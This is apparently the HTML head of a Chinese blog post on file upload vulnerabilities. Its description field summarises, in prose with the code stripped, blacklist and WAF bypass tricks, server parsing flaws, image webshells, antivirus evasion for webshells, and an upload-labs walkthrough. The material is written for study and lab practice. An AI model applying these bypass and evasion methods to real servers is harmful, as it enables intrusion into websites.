@@ -1,0 +1,1134 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>文件上传漏洞 | Shalom`s Blog</title><meta name="keywords" content="网络安全,web安全,文件上传"><meta name="author" content="Shalom"><meta name="copyright" content="Shalom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="文件上传漏洞"><meta name="application-name" content="文件上传漏洞"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="文件上传漏洞"><meta property="og:url" content="https://blog.shalom86012.eu.org/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html"><meta property="og:site_name" content="Shalom`s Blog"><meta property="og:description" content="1 文件上传漏洞基础文件上传漏洞是指在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户可以上传恶意的脚本文件，有可能获取执行服务端命令的能力。  这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://img.shalom86012.eu.org/imgs/wallhaven-5dg579.png"><meta property="article:author" content="Shalom"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://img.shalom86012.eu.org/imgs/wallhaven-5dg579.png"><meta name="description" content="1 文件上传漏洞基础文件上传漏洞是指在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户可以上传恶意的脚本文件，有可能获取执行服务端命令的能力。  这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，"><link rel="shortcut icon" href="https://img.shalom86012.eu.org/imgs/Shalom.webp"><link rel="canonical" href="https://blog.shalom86012.eu.org/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-TECSCZ4DMP"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-TECSCZ4DMP');
+</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;49e17b2f76e54defab58d9e307081e71&quot;}"></script><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: 'https://twikoo-vercel.shalom86014.eu.org/',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助"]},
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Shalom","link":"链接: ","source":"来源: Shalom`s Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Shalom`s Blog',
+  title: '文件上传漏洞',
+  postAI: '',
+  pageFillDescription: '1 文件上传漏洞基础, 1.1 文件上传实战思路, 2 文件上传绕过分类, 2.1 前端检测, 2.2 黑名单, 2.2.1 特殊后缀, 2.2.2 .htaccess解析 (Apache), 2.2.3 大小写绕过, 2.2.4 点绕过 (Windows), 2.2.5 空格绕过 (Windows), 2.2.6 $DATA绕过 (Windows), 2.2.7 双写绕过, 2.3 白名单, 2.3.1 MIME绕过, 2.3.2 %00截断, 2.4 内容及其他, 2.4.1 文件头检测, 2.4.2 二次渲染, 2.4.3 条件竞争, 2.4.4 突破getimagesize, 4.5 突破exif_imagetype, 3 解析漏洞, 3.1 IIS解析漏洞, 3.1.1 IIS5.0x2F6.0, 目录解析, 文件解析, 修复建议, 3.1.2 IIS7.0x2FIIS7.5, IIS7.0x2FIIS7.5 Fast-CGI, 3.2 Apache解析漏洞, 3.2.1 Apache换行解析漏洞, 3.2.2 Apache多后缀解析漏洞, 3.2.3 特殊后缀解析, 3.2.4 .htaccess解析漏洞, 3.2.5 Apache SSI 远程命令执行漏洞, 3.2.6 Apache文件读取amp命令执行漏洞, 3.2.7 Apache路径穿越漏洞, 3.3 Nginx解析漏洞, 3.3.1 空字节代码执行漏洞, 3.3.2 文件名逻辑漏洞, 3.3.3 PHP CGI解析漏洞, 3.3.4 .user.ini, 4 编辑器漏洞, 5 WAF绕过, 5.1 HTTP文件上传数据包解析, 5.1.1 文件上传在数据包中可修改的地方, 5.2 字符变异, 5.2.1 引号变换, 5.2.2 大小写变换, 5.2.3 添加换行符, 5.2.4 多个分号, 5.2.5 多个等号, 5.2.6 变换Content-Disposition的值, 5.2.7 畸形的boundary头部, 5.3 顺序颠倒, 5.3.1 交换name和filename的顺序, 5.3.2 交换Content-Disposition和Content-Type的顺序, 5.3.3 交换不同boundary内容的顺序, 5.4 数据重复, 5.4.1 boundary内容重复, 5.4.2 filename重复, 5.5 数据溢出, 5.5.1 name与filename之间插入垃圾数据, 5.5.2 boundary字符串中加入垃圾数据, 5.5.3 boundray末尾插入垃圾数据, 5.5.4 multipartx2Fform-data与boundary之间插入垃圾数据, 5.6 数据截断, 5.6.1 回车换行截断, 5.6.2 分号截断, 5.6.3 引号截断, 5.6.4 00截断, 5.7 安全狗绕过, 5.7.1 编写脚本利用数据溢出绕过, 5.7.2 利用00截断绕过, 6 安全修复, 7 图片马制作方法, 8 Webshell免杀, 8.1 可变变量绕过, 8.2 各种加密绕过, 8.3 传参绕过, 8.3 传参混淆, 9 upload-labs 21关, Pass-01 前端检验绕过, Pass-02 MIME类型, Pass-03 黑名单绕过之php3、php5, Pass-04 黑名单绕过.htaccess和文件名叠加特性绕过, .htaccess, 分号配合IIS解析漏洞, 冒号配合PHP和Windows文件命名环境的叠加特性, Pass-05 .user.ini, Pass-06 大小写绕过, Pass-07 空格点, Pass-08 空格点、点空格, Pass-09 基于文件流特性$DATA绕过, Pass-10 点空格点, Pass-11 双写, Pass-12 %00截断, Pass-13 00绕过, Pass-14 图片🐎, Pass-15 图片🐎, Pass-16 图片🐎, Pass-17 二次渲染, Pass-18 条件竞争, Pass-19 条件竞争之重命名竞争, Pass-20 /., Pass-21文件上传漏洞基础文件上传漏洞是指在文件上传的功能处若服务端脚本语言未对上传的文件进行严格验证和过滤导致恶意用户可以上传恶意的脚本文件有可能获取执行服务端命令的能力这里上传的文件可以是木马病毒恶意脚本或者等这种攻击方式是最为直接和有效的文件上传本身没有问题有问题的是文件上传后服务器怎么处理解释文件如果服务器的处理逻辑做的不够安全则会导致严重的后果文件上传实战思路文件上传和文件执行是两个东西思路如果有一个网站要从文件上传的方向开始先看中间件看是否存在解析漏洞编辑器漏洞如果有如何找字典扫描扫描会员中心等可能存在文件上传的位置找到后如何利用验证绕过文件上传绕过分类前端检测主要是通过代码进行检测非常容易绕过操作查看相关代码删除引用相关函数的代码或修改返回值为或禁用等黑名单黑名单就是服务端明确不让上传的文件后缀例如等特殊后缀特殊解析后缀绕过是由于黑名单过滤规则不严谨在某些特定的情况下的后缀也能够被当作文件进行解析例如等情况在配置文件夹中需要将这样的一段话前面的注释删除重启让其生效解析原理是提供的一种可作用于当前目录及其子目录的特殊配置文件如果网站开启了功能攻击者可能上传文件覆盖文件解析规则从而导致解析漏洞产生操作上传文件内容如下意思是把任意文件都当做文件解析如果双引号内写入意思是把该目录下的当做文件解析再上传图片马访问该图片即可大小写绕过服务端未将后缀进行统一的格式转换同时由于系统对后缀大小写并不敏感所以将改成也会被当作进行解析点绕过利用了对文件和文件名的限制当将点放在结尾的时候就会触发操作系统的命名规范问题所以在生成文件的时候添加在结尾的点就会被去除操作抓包拦截在文件名后加一个点例如部分情况下过滤是一次性的只删除一次点可以抓包并在文件名后添加点空格点来绕过空格绕过有些后端没有对文件名进行去除空格处理而黑名单中又没有对这样的文件后缀名过滤当我们上传一个类似于空格的文件这样就会成功上传到服务器的目录中在服务器中空格会被系统自动去除操作抓包拦截文件名后加空格例如空格绕过在中如果文件名后加上会把之后的数据当成文件流处理不会检测后缀名且保持之前的文件名操作抓包拦截在文件名后加例如双写绕过服务端可能存在将后缀替换为空的情况但是可能只过滤了一次所以就出现了可以通过双写绕过的可能过滤是从左到右进行匹配所以可以把双写成白名单白名单就是服务端明确可以上传的格式后缀例如等绕过服务端类型检测是通过检查中包含的字段中的值来判断上传文件是否合法的所以修改就可以绕过是描述消息内容类型的因特网标准消息包含文本图像音频视频以及其他应用程序专用的数据文件扩展名操作上传文件抓包拦截将的值修改为等允许的类型截断不是代表空格而是一个空字符当程序执行到后后面的数据就会停止意思就是误当作结束符把后面的数据直接忽略了这就会导致漏洞产生文件上传时文件扩展名验证会对包含后面的整个扩展名进行验证但保存时只保存前面的文件名环境操作上传图片马抓包拦截如果文件名在请求包的第一行中请求行修改为保存后的文件名为如果文件名在下方请求体中在文件名后加任意一个字符以数字为例点击来查看进制的请求包找到刚才添加的字符位置将其的进制为改为放行或者在文件名后加上选中右键转换选中内容解码内容及其他文件头检测文件头是文件开头的一段二进制码不同类型的图片也就会有不同的二进制头文件头文件头文件头二次渲染二次渲染就是在我们上传的图片后网站会对图片进行二次处理比如对图片的尺寸格式以及网站对图片进行定义的一些要求等进行处理并且服务器会对里面的内容进行二次替换更新在处理完后会生成一个合规的图片在网站上显示出来操作把一句话插入图片在二次渲染后会保留的那部分数据里确保不会在二次处理时删除掉条件竞争在源代码中是存在校验的但是校验是在文件上传后才开始校验也就是文件先上传至服务器中然后服务器会对该文件进行校验当符合的时候则会对文件进行重命名当文件不符合要求的时候就对将文件进行删除在服务器对文件删除前进行访问由于文件在访问过程中服务器是无法删除的所以就可以利用这个节点实现条件竞争操作上传的文件内容可以为意思是新建一个文件突破函数是用于获取图像大小及相关信息成功返回一个数组失败则返回产生一条级的错误信息通过对图片及代码进行合成为图片马这个时候函数既可以获取图片信息配合解析漏洞将图片马当作文件解析从而绕过函数的限制突破读取图像的第一个字节并检查其签名当找到正确的签名时将返回适当的常量值否则返回值为可以通过制作图片马绕过再配合文件包含漏洞解析文件来获取服务器配置信息解析漏洞解析漏洞就是指服务器应用程序在解析某些精心构造的后缀文件的时候会将相关的文件解析成网页的脚本从而导致实现控制网站同时大部分的解析漏洞都是由应用程序产生的解析漏洞目录解析在以为文件夹名的文件夹下的任何文件都将作为文件执行也就是当目录为的时候那么当访问该目录下的图片的时候如就会被当作执行文件解析如果文件名为由于不解析后面的内容就会把文件当作进行解析同时还存在也可以进行解析修复建议限制上传目录的执行权限不允许执行脚本不允许创建目录上传的文件进行重命名由于配置文件中文件不存在时会修正路径向前递归解析因此导致访问文件时在路径后添加任意以结尾的路径名即可将该文件以格式执行例如会被当做解析环境里的在运行模式下操作上传图片马访问该图片时图片名后加或者图片马内容包含以下内容访问后新建一个解析漏洞参考教程换行解析漏洞漏洞编号版本原理在解析时将被当做进行解析导致绕过一些服务器的安全策略操作上传文件抓包拦截在文件名后加任意一个字符以数字为例点击来查看这个请求包的进制模式找到刚才添加的任意字符所在位置将其对应的进制的进制为改为再放行该请求即可访问能够成功解析多后缀解析漏洞原理支持一个文件拥有多个后缀并为不同后缀执行不同的指令比如配置文件中有这项的话在有多个后缀的情况下只要一个文件含有后缀的文件就会被识别成文件没必要是最后一个后缀此外解析文件的时候有一个原则就是以后面的扩展名来解析当遇见不认识的扩展名的时候就会从后向前解析直到遇到能够解析的后缀名为止多用于绕过黑名单的检查操作上传文件名为或的文件文件内容可以是特殊后缀解析原理以为例配置文件中正则表达式匹配到以后缀名结尾的文件时会把文件交给解析器执行同理对于默认可匹配的后缀名有解析漏洞原理是提供的一种可作用于当前目录及其子目录的特殊配置文件如果网站开启了功能攻击者可能上传文件覆盖文件解析规则从而导致解析漏洞产生操作上传文件内容如下意思是把任意文件都当做文件解析如果双引号内写入意思是把该目录下的当做文件解析再上传图片马访问该图片即可远程命令执行漏洞原理如果目标服务器开启了与支持我们可以上传一个文件并利用操作上传一个文件内容为命令可以列出当前目录所有文件文件读取命令执行漏洞漏洞编号版本原理在版本中如果设置了穿越的目录允许被访问默认情况下是不允许的就可以读取位于服务器目录以外的其他文件或者读取目录中的脚本文件源码或者在开启了或的服务器上执行任意命令操作执行以下命令读取文件一个可以访问的目录点的编码为或者可以替换为执行命令一个可以访问的目录路径穿越漏洞漏洞编号版本原理由修复不完整导致攻击者可以使用路径遍历攻击将映射到类别名指令配置的目录之外的文件操作执行命令读取文件一个可访问的目录解析漏洞空字节代码执行漏洞版本原理低版本在遇到空字节时因为与后端处理不一致导致末尾包含空字节的文件时也能被按照后缀解析执行攻击者可以上传图片马通过访问来执行其中的代码文件名逻辑漏洞漏洞编号版本原理该漏洞存在于对于的配置上如果配置不当容易使得实现对等特殊字符解析出现问题造成将特殊构造的交给来进行处理而则因为特殊字符的问题无法接收含有特殊字符的或者是造成了在位置处的截断从而造成了客户上传的文件被当作代码来解析操作图片马内容为上传图片马抓包拦截将文件名重名为先用进行占位之后通过进制修改为空格放行这时的文件名为访问该图片抓包拦截把图片名改为把通过进制修改为空格和截断符放行可看到信息解析漏洞原理以模式解析是的进程管理器将请求内容按照协议格式封装通过报文传输给解析将数据还原执行变量值指向的文件但由于默认配置文件中参数的作用文件不存在时会修正路径向前递归解析因此导致访问文件时在路径后添加任意以结尾的路径名即可将该文件以格式执行操作上传访问要求服务器脚本语言为并且使用模式版本上传目录下要有可执行的文件原理会影响中的配置从而将指定的文件内容按来解析影响的范围为该文件所在的目录以及子目录需要等待中的设置的时间或重启才能生效且只在之后的版本才生效可用于中的文件有同样的效果只能用于中有以下两行代码用户自定义的文件的名字默认是重新读取用户文件的时间间隔默认是秒分钟操作先上传一个文件这个文件的内容为再上传一个图片马起到的作用相当于在可执行的文件前插入图片马中的内容访问上传目录中已经存在的可执行文件即可编辑器漏洞编辑器也就是在线的编辑器比如在搭建博客后需要发布文章那么用来发布文章的界面就是编辑器当然编辑器有很多如百度新版等等相关资料编辑器漏洞详解绕过应用防护系统也称为网站应用级入侵防御系统英文简称文件上传数据包解析文件上传实质上还是客户端的请求消息主体是一些上传信息前端上传页面需要指定为才能正常上传文件正常的文件上传数据包如下请求头中存在以下特征表示该请求是一个文件上传请求存在字符串作用为分隔符以区分数据请求体存在以下特征指示如何处理响应的内容以及如何呈现给用户例如指定是否应该直接显示在浏览器中弹出下载对话框或者在页面内嵌显示包含该字段的内容引用的字段的名称后面是一个包含传输文件的原始名称的字符串请求体中的的值就是的值在最前面加了两个除了最后标识结束的最后标识结束的最后默认会多出两个测试时最后一行的删掉也能成功上传文件上传在数据包中可修改的地方一般可更改表单参数值不能更改文件名可以更改文件视情况更改内容划分可以更改字符变异引号变换头部字段的值既可以添加单引号也可以添加双引号还可以不加引号都不会影响上传结果可以去除掉字符串中末尾的引号也能够正常上传大小写变换对这三个固定的字符串进行大小写转换比如转换成转换成添加换行符字段值与等号之间可以加入换行符依然可以正常上传下面我使用代替换行符多个分号文件解析时可能因为分号解析不到文件名导致绕过多个等号在的内容中使用多个等号对文件上传也没有影响变换的值某些在解析的时候认为值一定是造成绕过其实可以任意变换或为空畸形的头部可以变化为如下形式且不影响上传正常的畸形的大小写可变与之间可以使用空格分隔且中间可以插入任何值与之间可以使用逗号分隔且中间可以插入任何值之前可以直接加入任何值可行末尾可以使用逗号或分号隔开插入任何值顺序颠倒交换和的顺序因为规定了必须在最前面所以只能交换和的顺序有的可能会匹配在前面在后面可以导致绕过交换和的顺序与上述一样和也是能够交换顺序的交换不同内容的顺序不同内容也能够交换且不影响文件上传上传数据重复内容重复最后上传的文件是而非但是如果取的文件名只取了第一个就会被上传下面这样也是可以正常上传的上传重复最终上传成功的文件名是但是由于解析文件名时会解析到第一个正则默认都会匹配到第一个数据溢出与之间插入垃圾数据与之间插入大量垃圾数据上传注需在大量垃圾数据后加字符串中加入垃圾数据字符串的值可以为任何数据有一定的长度限制当长度达到无法处理时而服务器又能够处理那么就可以绕过上传文件上传末尾插入垃圾数据刚才讲到过末尾可以插入任何数据那么就可以在字符串末尾加入大量垃圾数据上传与之间插入垃圾数据刚才讲到过与之间可以插入任何数据那么就可以在与之间加入大量垃圾数据上传数据截断回车换行截断请求体是可以换行的但是中间不得有空行若匹配文件名到换行截止则可以绕过分号截断若匹配文件名到分号截止则可以绕过引号截断单双引号截断特性截断在中表示码中的而中作为特殊字符保留所以当中出现时就会认为读取已结束这里使用代替进制的字符安全狗绕过网站安全狗版干货最全的文件上传漏洞之拦截绕过总结编写脚本利用数据溢出绕过在字符串后加入大量垃圾数据使用编写上传上传测试长度为个字符将构造好的数据包放进尝试发送利用截断绕过上传文件使用抓包将的值改为然后打开分号的进制为修改进制内容把改成发送数据成功绕过安全修复后端验证针对后端验证的可以采用通过服务器进行验证后缀检测利用黑白名单进行过滤当然最好是使用白名单黑名单有时候总归会存在一些未想到的后缀而白名单就相对简单一点只需要想放通哪些后缀即可而且防范更好一些上传目录对上传文件到的目录可以设置一个不可执行的权限文件名针对文件名可以自定义一些随机数以及一些其他的内容进行二次修改从而改变文件的名称内容检测可以使用文件头完整性检测最好能够对内容的数据进行判断是否存在一些类似的代码若出现这类代码直接删除图片马制作方法方法一方法方法二直接使用工具增加备注写入一句话木马免杀通常可分为一句话木马小马大马内存马一句话木马是最简单也是最常见的形式这种木马体积小隐蔽较强免杀相对容易小马是功能较为简单的但比一句话木马稍复杂可能会包含一个简单的文件管理界面或命令执行功能大马是功能全面的通常带有图形用户界面提供文件管理数据库操作命令执行等多种功能比如常用的蚁剑冰蝎哥斯拉等大马由于功能复杂在做免杀时一般需要将大马伪装成合法管理工具分解成多个独立模块分别加载降低单点检测风险内存马是一种驻留在内存中的恶意代码通常通过修改服务器进程的内存空间来执行极难被发现和删除与一般的木马不同内存马免杀一般需要采用内存隐藏动态注入等方式尽可能的隐藏恶意代码在内存中的存在降低被持久发现的风险可变变量绕过一些安全检测机制会直接扫描代码中是否包含敏感函数调用对此可以把敏感的函数名隐藏在可变变量中下面通过把隐藏到可变变量中实现相当于是河马查杀能检测出来单纯的可变变量特性一般过不了杀软该方法通常需要和其他绕过方法配合使用各种加密绕过将特征函数先用某种加密方式加密再解密比如简单的加密在木马中把密文解密后调用简单的加密过不了杀软还是能被检测出来但是可以考虑和代码混淆一起使用在代码中加入与主要功能无关的代码可以干扰分析工具和反病毒软件的检测提高隐蔽性在此基础上增加和两个无用函数并调用修改后可以过通过河马然而可以被云沙箱检测出来安恒云沙箱此外加密函数可以考虑采用更复杂的加密比如加密首先写一个加密代码在本地生成一个和密文然后在木马中传入密文和并写一个解码函数该样例可以逃过安恒的沙箱查杀试一试河马和也可以通过传参绕过可以把传入的函数名写在请求中获取通过将函数名动态地从外部传递此时可以把传参为把作为命令该方法可以与回调函数结合结合前面的加密绕过思路加密函数该例子仍能被河马查杀可以采用更复杂的加密函数尝试传参混淆使用中的分隔函数用某个符号把传入的参数做一个分隔再结合回调函数调用执行攻击者可以传入达到目的该方法可以避开河马查杀上通过所有杀软沙箱检测也顺利绕过关前端检验绕过对上传做了限制将相应的语句删掉或者将禁用类型用进行抓包修改信息头将修改为黑名单绕过之文件的后缀名进行了限制但是在中的文件都会被解析为文件因此我们需要将原来的改为即可当然这种方法也只有低版本的中才能复现可以上传文件但该文件不一定能够执行黑名单绕过和文件名叠加特性绕过环境没限制文件是配置文件通常位于网站的根目录或特定的文件中并影响该目录及子目录每个目录都可以有这个文件文件可以通过文本编辑器直接进行修改或创建且修改后会立马生效不用重启文件名上传给的任意文件类型都当作文件来解析将后缀名为的文件解析为脚本执行将后缀名为的文件用处理器来处理效果同上将所有文件解析为脚本执行这一步失败成功分号配合解析漏洞环境可以绕过图片限制含有可以当做文件正常解析冒号配合和文件命名环境的叠加特性利用和环境的叠加特性在直接修改文件名称不能直接加冒号我们先以图片的格式上传然后抓包修改文件名称加上冒号上传一个名为的文件但是这样上传的是的文件在抓包工具中将文件名改为或或或后再次上传重写文件内容代码就会写入原来的空文件中这种方式分两步上传文件追加写入内容黑名单中没有是的配置文件中的字段也会被视为配置文件来处理从而导致的文件解析漏洞注意该要求版本大于等于版本模式创建文件内容为指定一个文件自动包含在要执行的文件后上传上传文件内容为一句话木马再访问上传目录下的经测试任意文件都可以即可将内的内容脚本正常执行例如大小写绕过上传时后缀改为等大写字母用蚁剑测试时模式失败模式成功空格点环境抓包文件名后缀改为上传后服务器文件名后缀还是空格点点空格环境抓包文件名后缀改为或空格上传后服务器文件名后缀还是基于文件流特性绕过下文件流特性源代码没有以下限制去除字符串源代码没有这句抓包文件名后缀改为上传后服务器文件名后缀还是点空格点抓包文件名后缀改为上传后服务器文件名后缀还是双写方法一直接上传木马文件上传后服务器文件名后缀还是方法二上传木马文件抓包拦截修改为上传后服务器文件名后缀还是截断版本调至当在处理文件名或路径时如果遇到编码的它会被解释为一个空字节值为在以前会将这个空字节转换为的形式而恰恰在以前文件名出现会导致文件名被截断只保留之前的部分这样的情况可能会导致文件被保存到一个意外的位置从而产生安全风险这是因为语言的底层是语言而在语言中是字符串的结束符所以导致截断的发生点击上传木马图片抓包拦截在的路径后加上后面不管是什么东西都会被截断掉然后经过函数将临时文件重新复制给我们的截断之前的文件路径即把上传的木马图片内容存到中最后目录下保存了文件绕过版本调至本关接受值从变成了它俩的区别就是会自行解码而不会解码所以需要对进行解码所以在这一关我们就需要在后面加一个占位符将其进制改为空字节这样控制符就出现了最后在上传文件的时候就会触发截断上传木马图片抓包拦截在下方后加上点击以进制模式浏览找到后面的将其进制换成上传后服务器文件名是刚才指定的上传文件也可以只要内容是木马就行然后改成后缀为来通过白名单在后指定一个文件名再跟一个字符在模式中将这个字符改为就行了图片执行普通图片木马图片马图片同图片开启上传图片利用图片路路径加载即可例如二次渲染开启条件竞争该代码执行后新建一个包含木马的文件中一般写一句话木马创建两个一个发上传文件一个发访问文件赶在服务器删除文件之前访问并生成木马文件在下的页面可以看到我们上传文件抓到的包我们只需一直发送这个包即可首先在页面点击转到页面修改选择之后该页面就会多一个条目这里选择无限重复条件竞争之重命名竞争环境老版本之后为新版本默认把后缀的文件当做解析上传保存名称直接在文件名末尾加上来源于审计代码渗透测试黑盒测试代码审计白盒测试灰盒测试黑白',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-28 11:39:11',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://img.shalom86012.eu.org/imgs/Shalom.webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
